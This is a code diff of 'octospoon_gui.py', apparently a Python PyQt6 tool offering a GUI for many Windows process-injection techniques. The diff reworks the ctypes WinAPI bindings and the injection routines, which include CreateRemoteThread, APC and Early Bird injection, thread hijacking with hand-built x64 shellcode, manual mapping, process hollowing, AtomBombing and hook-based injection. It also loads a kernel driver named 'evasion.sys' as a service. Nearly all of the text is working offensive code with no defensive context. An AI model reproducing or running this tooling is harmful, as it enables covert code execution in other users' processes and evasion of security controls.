@@ -1,4 +1,4 @@
-# octospoon_gui.py - OCTOSPOON v6.0 FULL GUI + 16 INJECTION METHODS
+# octospoon_gui.py - OCTOSPOON v1.0 FULL GUI + 16 INJECTION METHODS
 import sys
 import os
 import ctypes
@@ -10,32 +10,10 @@ from ctypes import wintypes, windll, POINTER, sizeof, c_void_p, c_char, byref
 from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
     QLabel, QComboBox, QPushButton, QTextEdit, QFileDialog,
-    QListWidget, QSplitter, QMessageBox, QProgressBar, QCheckBox
+    QListWidget, QSplitter, QMessageBox, QProgressBar
 )
 from PyQt6.QtCore import Qt, QThread, pyqtSignal
 from PyQt6.QtGui import QFont
-
-# Define missing wintypes attributes
-wintypes.ULONG64 = ctypes.c_ulonglong
-wintypes.LONG64 = ctypes.c_longlong
-wintypes.ULONG_PTR = ctypes.c_ulonglong
-wintypes.LONG_PTR = ctypes.c_longlong
-wintypes.DWORD64 = ctypes.c_ulonglong
-
-# Add more missing wintypes
-wintypes.ACCESS_MASK = ctypes.c_ulong
-wintypes.LPVOID = ctypes.c_void_p
-wintypes.LPCVOID = ctypes.c_void_p
-wintypes.LPCWSTR = ctypes.c_wchar_p
-wintypes.LPWSTR = ctypes.c_wchar_p
-wintypes.LPBYTE = ctypes.POINTER(ctypes.c_byte)
-wintypes.HMODULE = wintypes.HANDLE
-wintypes.HINSTANCE = wintypes.HANDLE
-wintypes.HHOOK = wintypes.HANDLE
-wintypes.ATOM = wintypes.WORD
-wintypes.WPARAM = ctypes.c_ulonglong
-wintypes.LPARAM = ctypes.c_longlong
-wintypes.UINT = ctypes.c_uint
 
 # === WinAPI Constants ===
 kernel32 = windll.kernel32
@@ -64,9 +42,9 @@ HEAP_ZERO_MEMORY = 0x00000008
 class STARTUPINFOW(ctypes.Structure):
     _fields_ = [
         ("cb", wintypes.DWORD),
-        ("lpReserved", wintypes.LPWSTR),
-        ("lpDesktop", wintypes.LPWSTR),
-        ("lpTitle", wintypes.LPWSTR),
+        ("lpReserved", ctypes.c_wchar_p),
+        ("lpDesktop", ctypes.c_wchar_p),
+        ("lpTitle", ctypes.c_wchar_p),
         ("dwX", wintypes.DWORD),
         ("dwY", wintypes.DWORD),
         ("dwXSize", wintypes.DWORD),
@@ -77,7 +55,7 @@ class STARTUPINFOW(ctypes.Structure):
         ("dwFlags", wintypes.DWORD),
         ("wShowWindow", wintypes.WORD),
         ("cbReserved2", wintypes.WORD),
-        ("lpReserved2", wintypes.LPBYTE),
+        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
         ("hStdInput", wintypes.HANDLE),
         ("hStdOutput", wintypes.HANDLE),
         ("hStdError", wintypes.HANDLE),
@@ -137,7 +115,7 @@ class UNICODE_STRING(ctypes.Structure):
     _fields_ = [
         ("Length", wintypes.USHORT),
         ("MaximumLength", wintypes.USHORT),
-        ("Buffer", wintypes.LPWSTR),
+        ("Buffer", ctypes.c_wchar_p),
     ]
 
 class OBJECT_ATTRIBUTES(ctypes.Structure):
@@ -155,21 +133,22 @@ class CLIENT_ID(ctypes.Structure):
         ("UniqueProcess", wintypes.HANDLE),
         ("UniqueThread", wintypes.HANDLE),
     ]
+
 # === WINAPI Function Setup ===
 # Kernel32 Functions
 kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
 kernel32.OpenProcess.restype = wintypes.HANDLE
 
-kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
-kernel32.VirtualAllocEx.restype = wintypes.LPVOID
+kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
+kernel32.VirtualAllocEx.restype = ctypes.c_void_p
 
-kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
+kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
 kernel32.WriteProcessMemory.restype = wintypes.BOOL
 
-kernel32.ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
+kernel32.ReadProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
 kernel32.ReadProcessMemory.restype = wintypes.BOOL
 
-kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
+kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, POINTER(wintypes.DWORD)]
 kernel32.CreateRemoteThread.restype = wintypes.HANDLE
 
 kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
@@ -178,21 +157,21 @@ kernel32.WaitForSingleObject.restype = wintypes.DWORD
 kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
 kernel32.CloseHandle.restype = wintypes.BOOL
 
-kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
-kernel32.GetModuleHandleW.restype = wintypes.HMODULE
+kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
+kernel32.GetModuleHandleW.restype = wintypes.HANDLE
 
-kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
-kernel32.GetProcAddress.restype = wintypes.LPVOID
+kernel32.GetProcAddress.argtypes = [wintypes.HANDLE, ctypes.c_char_p]
+kernel32.GetProcAddress.restype = ctypes.c_void_p
 
 kernel32.GetCurrentProcess.restype = wintypes.HANDLE
 
 kernel32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
 kernel32.OpenThread.restype = wintypes.HANDLE
 
-kernel32.QueueUserAPC.argtypes = [wintypes.LPVOID, wintypes.HANDLE, ctypes.c_ulonglong]
+kernel32.QueueUserAPC.argtypes = [ctypes.c_void_p, wintypes.HANDLE, ctypes.c_ulonglong]
 kernel32.QueueUserAPC.restype = wintypes.DWORD
 
-kernel32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, c_void_p, c_void_p, wintypes.BOOL, wintypes.DWORD, c_void_p, wintypes.LPCWSTR, POINTER(STARTUPINFOW), POINTER(PROCESS_INFORMATION)]
+kernel32.CreateProcessW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p, ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, ctypes.c_wchar_p, POINTER(STARTUPINFOW), POINTER(PROCESS_INFORMATION)]
 kernel32.CreateProcessW.restype = wintypes.BOOL
 
 kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, POINTER(CONTEXT)]
@@ -207,61 +186,80 @@ kernel32.ResumeThread.restype = wintypes.DWORD
 kernel32.SuspendThread.argtypes = [wintypes.HANDLE]
 kernel32.SuspendThread.restype = wintypes.DWORD
 
-kernel32.LoadLibraryW.argtypes = [wintypes.LPCWSTR]
-kernel32.LoadLibraryW.restype = wintypes.HMODULE
+kernel32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
+kernel32.LoadLibraryW.restype = wintypes.HANDLE
 
-kernel32.FreeLibrary.argtypes = [wintypes.HMODULE]
+kernel32.FreeLibrary.argtypes = [wintypes.HANDLE]
 kernel32.FreeLibrary.restype = wintypes.BOOL
 
-kernel32.CreateFileMappingW.argtypes = [wintypes.HANDLE, c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPCWSTR]
+kernel32.CreateFileMappingW.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, ctypes.c_wchar_p]
 kernel32.CreateFileMappingW.restype = wintypes.HANDLE
 
 kernel32.MapViewOfFile.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, ctypes.c_size_t]
-kernel32.MapViewOfFile.restype = wintypes.LPVOID
+kernel32.MapViewOfFile.restype = ctypes.c_void_p
 
-kernel32.UnmapViewOfFile.argtypes = [wintypes.LPCVOID]
+kernel32.UnmapViewOfFile.argtypes = [ctypes.c_void_p]
 kernel32.UnmapViewOfFile.restype = wintypes.BOOL
 
-kernel32.OpenFileMappingW.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.LPCWSTR]
+kernel32.OpenFileMappingW.argtypes = [wintypes.DWORD, wintypes.BOOL, ctypes.c_wchar_p]
 kernel32.OpenFileMappingW.restype = wintypes.HANDLE
 
 kernel32.HeapCreate.argtypes = [wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t]
 kernel32.HeapCreate.restype = wintypes.HANDLE
 
 kernel32.HeapAlloc.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_size_t]
-kernel32.HeapAlloc.restype = wintypes.LPVOID
+kernel32.HeapAlloc.restype = ctypes.c_void_p
+
+kernel32.GetLastError.restype = wintypes.DWORD
+
+kernel32.GlobalAddAtomW.argtypes = [ctypes.c_wchar_p]
+kernel32.GlobalAddAtomW.restype = wintypes.WORD
+
+kernel32.GlobalDeleteAtom.argtypes = [wintypes.WORD]
+kernel32.GlobalDeleteAtom.restype = wintypes.WORD
 
 # NTDLL Functions
+ntdll.NtCreateSection = windll.ntdll.NtCreateSection
 ntdll.NtCreateSection.argtypes = [POINTER(wintypes.HANDLE), ctypes.c_ulong, POINTER(OBJECT_ATTRIBUTES), POINTER(wintypes.LARGE_INTEGER), wintypes.ULONG, wintypes.ULONG, wintypes.HANDLE]
-ntdll.NtCreateSection.restype = wintypes.LONG
+ntdll.NtCreateSection.restype = ctypes.c_long
 
-ntdll.NtMapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.HANDLE, POINTER(wintypes.LPVOID), wintypes.ULONG_PTR, ctypes.c_size_t, POINTER(wintypes.LARGE_INTEGER), POINTER(wintypes.ULONG), wintypes.ULONG, wintypes.ULONG, wintypes.ULONG]
-ntdll.NtMapViewOfSection.restype = wintypes.LONG
+ntdll.NtMapViewOfSection = windll.ntdll.NtMapViewOfSection
+ntdll.NtMapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.HANDLE, POINTER(ctypes.c_void_p), ctypes.c_ulonglong, ctypes.c_size_t, POINTER(wintypes.LARGE_INTEGER), POINTER(wintypes.ULONG), wintypes.ULONG, wintypes.ULONG, wintypes.ULONG]
+ntdll.NtMapViewOfSection.restype = ctypes.c_long
 
-ntdll.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
-ntdll.NtUnmapViewOfSection.restype = wintypes.LONG
+ntdll.NtUnmapViewOfSection = windll.ntdll.NtUnmapViewOfSection
+ntdll.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+ntdll.NtUnmapViewOfSection.restype = ctypes.c_long
 
-ntdll.NtCreateThreadEx.argtypes = [POINTER(wintypes.HANDLE), wintypes.ACCESS_MASK, c_void_p, wintypes.HANDLE, wintypes.LPVOID, c_void_p, wintypes.ULONG, c_void_p, c_void_p, c_void_p, c_void_p]
-ntdll.NtCreateThreadEx.restype = wintypes.LONG
+ntdll.NtCreateThreadEx = windll.ntdll.NtCreateThreadEx
+ntdll.NtCreateThreadEx.argtypes = [POINTER(wintypes.HANDLE), ctypes.c_ulong, ctypes.c_void_p, wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
+ntdll.NtCreateThreadEx.restype = ctypes.c_long
 
-ntdll.RtlCreateUserThread.argtypes = [wintypes.HANDLE, c_void_p, wintypes.BOOL, wintypes.ULONG, c_void_p, c_void_p, wintypes.LPVOID, c_void_p, POINTER(wintypes.HANDLE), POINTER(CLIENT_ID)]
-ntdll.RtlCreateUserThread.restype = wintypes.LONG
+ntdll.RtlCreateUserThread = windll.ntdll.RtlCreateUserThread
+ntdll.RtlCreateUserThread.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.BOOL, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, POINTER(wintypes.HANDLE), POINTER(CLIENT_ID)]
+ntdll.RtlCreateUserThread.restype = ctypes.c_long
 
 # PSAPI Functions
-psapi.EnumProcessModules.argtypes = [wintypes.HANDLE, POINTER(wintypes.HMODULE), wintypes.DWORD, POINTER(wintypes.DWORD)]
+psapi.EnumProcessModules.argtypes = [wintypes.HANDLE, POINTER(wintypes.HANDLE), wintypes.DWORD, POINTER(wintypes.DWORD)]
 psapi.EnumProcessModules.restype = wintypes.BOOL
 
-# User32 Functions - Replace the existing SetWindowsHookEx section with this:
+psapi.GetModuleFileNameExA.argtypes = [wintypes.HANDLE, wintypes.HANDLE, ctypes.c_char_p, wintypes.DWORD]
+psapi.GetModuleFileNameExA.restype = wintypes.DWORD
+
+psapi.GetModuleInformation.argtypes = [wintypes.HANDLE, wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD]
+psapi.GetModuleInformation.restype = wintypes.BOOL
+
+# User32 Functions
 user32.SetWindowsHookExW = windll.user32.SetWindowsHookExW
-user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
-user32.SetWindowsHookExW.restype = ctypes.c_void_p  # HHOOK is a pointer
+user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HANDLE, wintypes.DWORD]
+user32.SetWindowsHookExW.restype = wintypes.HANDLE
 
 user32.UnhookWindowsHookEx = windll.user32.UnhookWindowsHookEx
-user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]  # HHOOK
+user32.UnhookWindowsHookEx.argtypes = [wintypes.HANDLE]
 user32.UnhookWindowsHookEx.restype = wintypes.BOOL
 
 user32.PostThreadMessageW = windll.user32.PostThreadMessageW
-user32.PostThreadMessageW.argtypes = [wintypes.DWORD, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
+user32.PostThreadMessageW.argtypes = [wintypes.DWORD, ctypes.c_uint, ctypes.c_ulonglong, ctypes.c_longlong]
 user32.PostThreadMessageW.restype = wintypes.BOOL
 
 
@@ -269,31 +267,22 @@ user32.PostThreadMessageW.restype = wintypes.BOOL
 def build_loadlibrary_shellcode(dll_path_addr, loadlib_addr, alert_addr=0):
     """Build x64 shellcode to call LoadLibraryA and optionally NtTestAlert"""
     shellcode = bytearray()
-    # sub rsp, 0x28
-    shellcode.extend(b'\x48\x83\xEC\x28')
-    # mov rcx, dll_path
-    shellcode.extend(b'\x48\xB9')
+    shellcode.extend(b'\x48\x83\xEC\x28')  # sub rsp, 0x28
+    shellcode.extend(b'\x48\xB9')  # mov rcx, dll_path
     shellcode.extend(struct.pack('<Q', dll_path_addr))
-    # mov rax, LoadLibraryA
-    shellcode.extend(b'\x48\xB8')
+    shellcode.extend(b'\x48\xB8')  # mov rax, LoadLibraryA
     shellcode.extend(struct.pack('<Q', loadlib_addr))
-    # call rax
-    shellcode.extend(b'\xFF\xD0')
-    # Optional NtTestAlert
+    shellcode.extend(b'\xFF\xD0')  # call rax
     if alert_addr:
-        # mov rax, NtTestAlert
-        shellcode.extend(b'\x48\xB8')
+        shellcode.extend(b'\x48\xB8')  # mov rax, NtTestAlert
         shellcode.extend(struct.pack('<Q', alert_addr))
-        # call rax
-        shellcode.extend(b'\xFF\xD0')
-    # add rsp, 0x28
-    shellcode.extend(b'\x48\x83\xC4\x28')
-    # ret
-    shellcode.extend(b'\xC3')
+        shellcode.extend(b'\xFF\xD0')  # call rax
+    shellcode.extend(b'\x48\x83\xC4\x28')  # add rsp, 0x28
+    shellcode.extend(b'\xC3')  # ret
     return bytes(shellcode)
 
 
-# === Injection Worker ===
+# === Injection Worker Thread ===
 class InjectorThread(QThread):
     log_signal = pyqtSignal(str)
     done_signal = pyqtSignal(str)
@@ -316,7 +305,6 @@ class InjectorThread(QThread):
     def run(self):
         try:
             method_name = self.method.lower().replace(' ', '_')
-            # Map method names to their functions
             method_map = {
                 'standard': self.standard_injection,
                 'apc': self.apc_injection,
@@ -344,7 +332,6 @@ class InjectorThread(QThread):
     # === 1. Standard CreateRemoteThread ===
     def standard_injection(self):
         self.log("Starting Standard CreateRemoteThread Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
         if not h_process:
             raise Exception(f"Failed to open process {self.pid}")
@@ -358,9 +345,7 @@ class InjectorThread(QThread):
             raise Exception("Failed to allocate memory")
         
         bytes_written = ctypes.c_size_t(0)
-        if not kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written)):
-            kernel32.CloseHandle(h_process)
-            raise Exception("Failed to write DLL path")
+        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
         
         kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
         load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
@@ -368,31 +353,26 @@ class InjectorThread(QThread):
         thread_id = wintypes.DWORD(0)
         h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_mem, 0, byref(thread_id))
         
-        if not h_thread:
-            kernel32.CloseHandle(h_process)
+        if h_thread:
+            kernel32.WaitForSingleObject(h_thread, INFINITE)
+            kernel32.CloseHandle(h_thread)
+            self.log("Standard DLL injection completed")
+        else:
             raise Exception("Failed to create remote thread")
         
-        kernel32.WaitForSingleObject(h_thread, INFINITE)
-        
-        kernel32.CloseHandle(h_thread)
         kernel32.CloseHandle(h_process)
-        
-        self.log("Standard DLL injection completed")
 
     # === 2. APC Injection ===
     def apc_injection(self):
         self.log("Starting APC Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
         if not h_process:
             raise Exception(f"Failed to open process {self.pid}")
         
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
-        dll_path_size = len(dll_path_bytes)
-        
-        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
+        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
         bytes_written = ctypes.c_size_t(0)
-        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
+        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
         
         kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
         load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
@@ -415,30 +395,23 @@ class InjectorThread(QThread):
     # === 3. Early Bird Injection ===
     def early_bird_injection(self):
         self.log("Starting Early Bird APC Injection...")
-        
         si = STARTUPINFOW()
         si.cb = sizeof(STARTUPINFOW)
         pi = PROCESS_INFORMATION()
         
-        if not kernel32.CreateProcessW(
-            self.exe_path, None, None, None, False,
-            CREATE_SUSPENDED, None, None, byref(si), byref(pi)
-        ):
+        if not kernel32.CreateProcessW(self.exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi)):
             raise Exception("Failed to create suspended process")
         
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
-        dll_path_size = len(dll_path_bytes)
-        
-        remote_mem = kernel32.VirtualAllocEx(pi.hProcess, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
+        remote_mem = kernel32.VirtualAllocEx(pi.hProcess, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
         bytes_written = ctypes.c_size_t(0)
-        kernel32.WriteProcessMemory(pi.hProcess, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
+        kernel32.WriteProcessMemory(pi.hProcess, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
         
         kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
         load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
         
         kernel32.QueueUserAPC(load_library_addr, pi.hThread, remote_mem)
         kernel32.ResumeThread(pi.hThread)
-        
         self.log("Early Bird injection completed")
         
         kernel32.CloseHandle(pi.hThread)
@@ -447,7 +420,6 @@ class InjectorThread(QThread):
     # === 4. Thread Hijacking ===
     def thread_hijack_injection(self):
         self.log("Starting Thread Hijacking...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
         if not h_process:
             raise Exception(f"Failed to open process {self.pid}")
@@ -461,7 +433,6 @@ class InjectorThread(QThread):
         load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
         
         shellcode = build_loadlibrary_shellcode(remote_path, load_library_addr)
-        
         remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
         kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
         
@@ -487,14 +458,13 @@ class InjectorThread(QThread):
         
         kernel32.CloseHandle(h_process)
         if hijacked:
-            self.log(f"Thread hijacking completed")
+            self.log("Thread hijacking completed")
         else:
             raise Exception("Failed to hijack any thread")
 
     # === 5. Reflective DLL ===
     def reflective_injection(self):
         self.log("Starting Reflective DLL Injection...")
-        
         with open(self.dll_path, 'rb') as f:
             dll_data = f.read()
         
@@ -511,20 +481,24 @@ class InjectorThread(QThread):
         thread_id = wintypes.DWORD(0)
         h_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_entry, remote_base, 0, byref(thread_id))
         
-        kernel32.WaitForSingleObject(h_thread, INFINITE)
-        kernel32.CloseHandle(h_thread)
-        kernel32.CloseHandle(h_process)
+        if h_thread:
+            kernel32.WaitForSingleObject(h_thread, INFINITE)
+            kernel32.CloseHandle(h_thread)
+            self.log("Reflective DLL injection completed")
+        else:
+            raise Exception("Failed to create remote thread")
         
-        self.log("Reflective DLL injection completed")
+        kernel32.CloseHandle(h_process)
 
     # === 6. Manual Map ===
     def manual_map_injection(self):
         self.log("Starting Manual Map Injection...")
-        
         with open(self.dll_path, 'rb') as f:
             dll_data = f.read()
         
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
         section_handle = wintypes.HANDLE(0)
         max_size = wintypes.LARGE_INTEGER(len(dll_data))
@@ -534,25 +508,30 @@ class InjectorThread(QThread):
             kernel32.CloseHandle(h_process)
             raise Exception(f"NtCreateSection failed: 0x{status:X}")
         
-        local_base = c_void_p(0)
+        local_base = ctypes.c_void_p(0)
         view_size = ctypes.c_size_t(len(dll_data))
         
-        ntdll.NtMapViewOfSection(section_handle, kernel32.GetCurrentProcess(), byref(local_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
-        ctypes.memmove(local_base.value, dll_data, len(dll_data))
+        status = ntdll.NtMapViewOfSection(section_handle, kernel32.GetCurrentProcess(), byref(local_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
+        if status == 0 and local_base.value:
+            ctypes.memmove(local_base.value, dll_data, len(dll_data))
         
-        remote_base = c_void_p(0)
-        ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
+        remote_base = ctypes.c_void_p(0)
+        status = ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
         
-        ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), local_base)
+        if local_base.value:
+            ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), local_base)
+        
         kernel32.CloseHandle(section_handle)
         kernel32.CloseHandle(h_process)
         
-        self.log(f"Manual map completed at 0x{remote_base.value:X}")
+        if status == 0:
+            self.log(f"Manual map completed at 0x{remote_base.value:X}")
+        else:
+            raise Exception(f"NtMapViewOfSection failed: 0x{status:X}")
 
     # === 7. Process Hollowing ===
     def process_hollowing_injection(self):
         self.log("Starting Process Hollowing...")
-        
         with open(self.dll_path, 'rb') as f:
             pe_data = f.read()
         
@@ -610,8 +589,9 @@ class InjectorThread(QThread):
     # === 8. Thread Pool ===
     def thread_pool_injection(self):
         self.log("Starting Thread Pool Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
         dll_bytes = self.dll_path.encode('utf-16le') + b'\x00\x00'
         remote_path = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
@@ -641,7 +621,6 @@ class InjectorThread(QThread):
     # === 9. Kernel Driver ===
     def kernel_driver_injection(self):
         self.log("Starting Kernel Driver Injection...")
-        
         driver_path = os.path.abspath("drivers/evasion.sys")
         if not os.path.exists(driver_path):
             os.makedirs("drivers", exist_ok=True)
@@ -650,17 +629,19 @@ class InjectorThread(QThread):
             self.log("Placeholder driver created")
         
         try:
-            subprocess.run(f'sc create octospoon type= kernel binPath= "{driver_path}"', shell=True, capture_output=True, text=True)
-            subprocess.run('sc start octospoon', shell=True, capture_output=True, text=True)
-            self.log("Driver loaded (may require test signing mode)")
-        except:
+            subprocess.run(f'sc create octospoon type= kernel binPath= "{driver_path}"', shell=True, capture_output=True, text=True, check=True)
+            subprocess.run('sc start octospoon', shell=True, capture_output=True, text=True, check=True)
+            self.log("Driver loaded successfully")
+        except subprocess.CalledProcessError:
             self.log("Driver requires test signing mode and admin privileges")
 
     # === 10. AtomBombing ===
     def atombombing_injection(self):
         self.log("Starting AtomBombing Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
+        
         loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
         
         atom_ids = []
@@ -668,15 +649,14 @@ class InjectorThread(QThread):
         if dll_atom:
             atom_ids.append(dll_atom)
         
-        shellcode = build_loadlibrary_shellcode(0, loadlib)  # Placeholder address
-        
-        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
-        bytes_written = ctypes.c_size_t(0)
-        kernel32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), byref(bytes_written))
-        
         dll_bytes = self.dll_path.encode('ascii') + b'\x00'
         dll_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
+        bytes_written = ctypes.c_size_t(0)
         kernel32.WriteProcessMemory(h_process, dll_mem, dll_bytes, len(dll_bytes), byref(bytes_written))
+        
+        shellcode = build_loadlibrary_shellcode(dll_mem, loadlib)
+        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
+        kernel32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), byref(bytes_written))
         
         try:
             process = psutil.Process(self.pid)
@@ -695,10 +675,9 @@ class InjectorThread(QThread):
         kernel32.CloseHandle(h_process)
         self.log("AtomBombing completed")
 
-        # === 11. SetWindowsHookEx ===
+    # === 11. SetWindowsHookEx ===
     def sethook_injection(self):
         self.log("Starting SetWindowsHookEx Injection...")
-        
         try:
             process = psutil.Process(self.pid)
             threads = process.threads()
@@ -707,18 +686,14 @@ class InjectorThread(QThread):
             target_thread_id = threads[0].id
             
             dll_path = os.path.abspath(self.dll_path)
-            
-            # Load DLL to get module handle
             h_module = kernel32.LoadLibraryW(dll_path)
             if not h_module:
                 raise Exception("Failed to load DLL in local process")
             
-            # Set hook (WH_GETMESSAGE = 2)
             hook = user32.SetWindowsHookExW(2, None, h_module, target_thread_id)
             
             if hook:
                 self.log("Hook set successfully")
-                # Post message to trigger hook
                 user32.PostThreadMessageW(target_thread_id, 0, 0, 0)
                 time.sleep(1)
                 user32.UnhookWindowsHookEx(hook)
@@ -734,7 +709,6 @@ class InjectorThread(QThread):
     # === 12. PowerLoaderEx ===
     def powerloader_injection(self):
         self.log("Starting PowerLoaderEx Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
         if not h_process:
             raise Exception(f"Failed to open process {self.pid}")
@@ -742,19 +716,16 @@ class InjectorThread(QThread):
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
         section_name = f"Global\\PowerLoader{os.getpid()}"
         
-        # Create file mapping
         h_mapping = kernel32.CreateFileMappingW(INVALID_HANDLE_VALUE, None, PAGE_READWRITE, 0, len(dll_path_bytes), section_name)
         if not h_mapping:
             kernel32.CloseHandle(h_process)
             raise Exception("Failed to create file mapping")
         
-        # Write DLL path to shared memory
         map_view = kernel32.MapViewOfFile(h_mapping, FILE_MAP_WRITE, 0, 0, len(dll_path_bytes))
         if map_view:
             ctypes.memmove(map_view, dll_path_bytes, len(dll_path_bytes))
             kernel32.UnmapViewOfFile(map_view)
         
-        # Open section in remote process
